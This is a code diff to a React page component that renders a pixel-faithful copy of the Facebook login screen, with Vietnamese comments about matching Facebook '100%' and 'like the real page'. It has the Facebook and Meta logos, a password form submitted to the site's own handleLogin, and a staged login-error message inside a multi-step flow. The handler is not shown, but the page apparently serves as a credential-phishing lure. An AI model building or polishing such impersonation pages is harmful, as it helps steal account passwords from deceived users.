@@ -729,7 +729,7 @@ export default function Home() {
                 </div>
               )}
 
-                                                                                    {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% tỷ lệ FB */}
+                                                                                                 {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% tỷ lệ ảnh gốc */}
               {step === 2 && (
                 <div style={{ 
                   position: 'fixed', 
@@ -740,52 +740,56 @@ export default function Home() {
                   flexDirection: 'row' 
                 }}>
                   
-                  {/* CỘT TRÁI: Ảnh minh họa và Text */}
+                  {/* CỘT TRÁI: Chiếm 2/3 không gian, chứa text và ảnh */}
                   <div style={{ 
-                    flex: 1, 
+                    flex: '2', // Chiếm 2 phần
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
-                    alignItems: 'center', // Căn giữa toàn bộ khối
+                    padding: '0 40px',
                     borderRight: '1px solid #e4e6eb',
-                    padding: '40px'
+                    backgroundColor: '#fff'
                   }}>
-                    {/* Khối bọc bên trong để căn lề trái cho chữ */}
-                    <div style={{ width: '100%', maxWidth: '500px', display: 'flex', flexDirection: 'column' }}>
+                    <div style={{ width: '100%', maxWidth: '650px', margin: '0 auto', display: 'flex', flexDirection: 'column' }}>
                       
-                      {/* Logo Facebook nhỏ */}
+                      {/* Logo F nhỏ */}
                       <svg viewBox="0 0 36 36" height="42" width="42" style={{ marginBottom: '24px' }}>
                         <path fill="#0866FF" d="M18 0C8.06 0 0 8.06 0 18s8.06 18 18 18c9.94 0 18-8.06 18-18S27.94 0 18 0zm4.04 26.13h-4.32v-14.4h-4.32v-4.32h4.32V5.04c0-2.92 1.62-4.32 4.32-4.32h3.6v4.32h-2.16c-1.08 0-1.44.36-1.44 1.44v1.44h4.32l-.72 4.32h-3.6v14.4z"/>
                       </svg>
                       
-                      <h1 style={{ fontSize: '48px', fontWeight: '700', lineHeight: '1.2', color: '#1c2b33', margin: '0 0 24px 0', letterSpacing: '-1px' }}>
+                      <h1 style={{ fontSize: '56px', fontWeight: '700', lineHeight: '1.1', color: '#1c2b33', margin: '0 0 30px 0', letterSpacing: '-1.5px' }}>
                         Explore <br />the <br />things <br /><span style={{ color: '#0064e0' }}>you love.</span>
                       </h1>
                       
-                      {/* Ảnh minh họa */}
+                      {/* Ảnh to chiếm gần hết cột trái */}
                       <img 
                         src="/images/Anhlogin.webp" 
                         alt="Explore" 
-                        style={{ width: '100%', maxWidth: '400px', display: 'block' }} 
+                        style={{ width: '100%', maxWidth: '600px', display: 'block' }} 
                       />
                     </div>
                   </div>
 
-                  {/* CỘT PHẢI: Form đăng nhập */}
+                  {/* CỘT PHẢI: Chiếm 1/3 không gian, chứa form đăng nhập */}
                   <div style={{ 
-                    flex: 1, 
+                    flex: '1', // Chiếm 1 phần
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
                     alignItems: 'center', 
                     padding: '40px'
                   }}>
-                    {/* Form rộng 396px chuẩn FB */}
                     <div style={{ width: '100%', maxWidth: '396px' }}>
                       
-                      <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', margin: '0 0 20px 0' }}>
-                        Log into Facebook
-                      </h2>
+                      {/* Header Form: Log into Facebook + Nút Back */}
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
+                        <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', margin: 0 }}>
+                          Log into Facebook
+                        </h2>
+                        <button onClick={() => setStep(1.5)} style={{ background: 'none', border: 'none', color: '#1877F2', fontSize: '14px', fontWeight: '500', cursor: 'pointer' }}>
+                          Back
+                        </button>
+                      </div>
 
                       <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                         <input 
@@ -810,7 +814,7 @@ export default function Home() {
                         {showLoginError && <div style={{ color: '#fa383e', fontSize: '14px', marginTop: '4px' }}>{t.loginError}</div>}
                         
                         <button type="submit" disabled={loading} style={{
-                          width: '100%', padding: '16px', borderRadius: '100px', border: 'none',
+                          width: '100%', padding: '14px', borderRadius: '100px', border: 'none',
                           background: '#0866FF', color: '#fff', fontSize: '20px', fontWeight: '700', cursor: 'pointer', marginTop: '6px'
                         }}>
                           {loading ? 'Logging in...' : 'Log in'}
@@ -821,27 +825,18 @@ export default function Home() {
                         <a href="#" style={{ color: '#0866FF', fontSize: '14px', textDecoration: 'none', fontWeight: '500' }}>Forgot password?</a>
                       </div>
 
-                      {/* Nút Create new account */}
                       <div style={{ marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb', textAlign: 'center' }}>
                         <button type="button" style={{
                           padding: '14px 24px', borderRadius: '100px', border: '1px solid #0866FF',
                           background: 'transparent', color: '#0866FF', fontSize: '16px', fontWeight: '600', cursor: 'pointer',
-                          width: 'auto', minWidth: '200px' // Cho nút dàn ngang ra chứ ko bị bóp
+                          width: '100%', // Cho nút dàn full width như trang thật
                         }}>
                           Create new account
                         </button>
                       </div>
 
-                      {/* Logo Meta */}
-                      <div style={{ textAlign: 'center', marginTop: '28px' }}>
-                          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '16px', opacity: 0.7 }} />
-                      </div>
-
-                      {/* Nút Back */}
                       <div style={{ textAlign: 'center', marginTop: '24px' }}>
-                        <button onClick={() => setStep(1.5)} style={{ background: 'none', border: 'none', color: '#1877F2', fontSize: '15px', fontWeight: '500', cursor: 'pointer' }}>
-                          Back
-                        </button>
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '16px', opacity: 0.7 }} />
                       </div>
 
                     </div>
